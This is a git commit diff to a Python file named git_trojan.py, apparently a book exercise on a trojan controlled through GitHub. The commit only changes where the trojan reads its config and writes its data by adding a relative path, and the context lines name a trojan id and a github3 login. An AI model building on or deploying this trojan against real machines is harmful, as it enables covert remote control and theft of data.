3c2ab48da8a31ae6537bb5f44dcc54f3379fcf96
ILUXONCHIK <iluxon4ik@hotmail.com>
2016-02-20 09:10:34 +0000

    Add github login config

--- Chapter_07/trojan/git_trojan.py
+++ Chapter_07/trojan/git_trojan.py
@@ -3,8 +3,9 @@ from queue import Queue
 from github3 import login
 
 trojan_id = "abc" # unique id for this trojan
-trojan_config = "{0}.json".format(trojan_id)
-data_path = "data/{0}/".format(trojan_id)
+relative_path = "./Chapter_07/"
+trojan_config = relative_path + "{0}.json".format(trojan_id)
+data_path = relative_path + "data/{0}/".format(trojan_id)
 trojan_modules = []
 configured = False
 task_queue = Queue()
